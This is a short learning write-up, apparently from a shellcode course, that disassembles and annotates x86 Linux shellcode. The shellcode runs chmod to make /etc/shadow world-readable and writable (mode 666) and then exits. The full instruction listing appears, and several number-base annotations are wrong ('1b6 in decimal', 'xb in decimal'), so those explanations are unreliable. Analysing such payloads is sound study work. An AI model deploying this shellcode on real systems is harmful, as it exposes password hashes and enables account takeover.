# Solution (Using GDB and Libemu)

Using exec_compile.sh, the final shellcode is generated and executed. We can use GDB to analyze its behaviour. 

Using Libemu, we can obtain the next image of the process flow:

![alt text](https://github.com/MrSquid25/SLAE/blob/master/Assignment%205/chmod/chmod.png "Flow")

If we analyze the nasm code, we can reach the following conclusions:

      cwd
      push byte 0xf
      pop eax
      push edx
      call 0x1
      pop ebx
      push dword 0x1b6
      pop ecx
      int 0x80
      push byte 0x1
      pop eax
      int 0x80

1)   cwd
     
     push byte 0xf
     
     pop eax
          
          EAX is set to 15 (xb in decimal) which is chmod. Edx is set to 0 too. 
      
2)    push edx
            
          EDX is pushed to the stack 
    
3)    call 0x1 
      
          Next instruction is called 
     
 4)  pop ebx
 
          EBX is set to the file which will be modified, in this case, /etc/shadow
    
  5)  push dword 0x1b6
       
      pop ecx
      
          666 is pushed to the stack (1b6 in decimal) and assigned to ecx
          
   6) int 0x80 
   
            chmod is executed 
            EAX=15 (chmod syscall)
            EBX=/etc/shadow (PATH)
            ECX=666 (permissions to assign to the file)
            
   7) push byte 0x1
   
      pop eax
      
      int 0x80
      
            Exit function is called and the process exits quietly.
